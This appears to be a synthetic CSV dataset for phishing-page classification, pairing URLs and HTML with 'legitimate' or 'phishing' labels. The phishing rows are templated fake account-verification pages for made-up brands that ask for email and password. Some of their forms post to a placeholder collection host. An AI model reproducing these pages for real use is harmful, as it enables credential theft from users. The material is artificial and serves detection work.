url,html,label
https://store.example.org/articles/93,"<!doctype html><html><head><title>MediaBox — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to MediaBox</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://account-validation.help/verify/account69,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""/verify"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/signin?session=1298176,"<!doctype html><html><head><title>Northstar Bank Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your Northstar Bank account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/verify/account65,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://account-validation.help/secure-update206,"<!doctype html><html><head><title>ShopSphere Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your ShopSphere account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/25,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://news.example.net/articles/180,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://account-validation.help/login213,"<!doctype html><html><head><title>CloudMail Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your CloudMail account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://store.example.org/articles/113,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://example.org/articles/42,"<!doctype html><html><head><title>ShopSphere — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to ShopSphere</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://login-check-support.click/login169,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://login-check-support.click/verify/account166,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action="""" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
http://account-validation.help/secure-update57,"<!doctype html><html><head><title>MediaBox Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your MediaBox account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://example.org/articles/172,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://example.org/articles/124,"<!doctype html><html><head><title>Northstar Bank — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to Northstar Bank</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
http://account-validation.help/secure-update64,"<!doctype html><html><head><title>PayWay Account Verification</title>
    <meta http-equiv=""refresh"" content=""0;url=/continue""></head><body>
    <h1>Urgent: verify your PayWay account immediately</h1><p>Your access is suspended. Confirm password and payment details now.</p>
    <form action=""https://collect-details.invalid/submit"" method=""post""><input type=""hidden"" name=""token"" value=""x"">
    <input name=""email"" type=""email""><input name=""password"" type=""password""><button>Verify now</button></form>
    <iframe src=""https://tracking.invalid/frame""></iframe><a href=""javascript:void(0)"">Continue</a></body></html>",phishing
https://university.example.edu/articles/22,"<!doctype html><html><head><title>PayWay — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to PayWay</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
https://docs.example.com/articles/46,"<!doctype html><html><head><title>CloudMail — Home</title></head>
    <body><header><a href=""/about"">About</a><a href=""/products"">Products</a><a href=""/contact"">Contact</a><a href=""/privacy"">Privacy</a></header><main><h1>Welcome to CloudMail</h1>
    <p>Learn about our services, support resources, and public information.</p>
    <img src=""/assets/logo.png"" alt=""logo""><a href=""/terms"">Terms</a></main></body></html>",legitimate
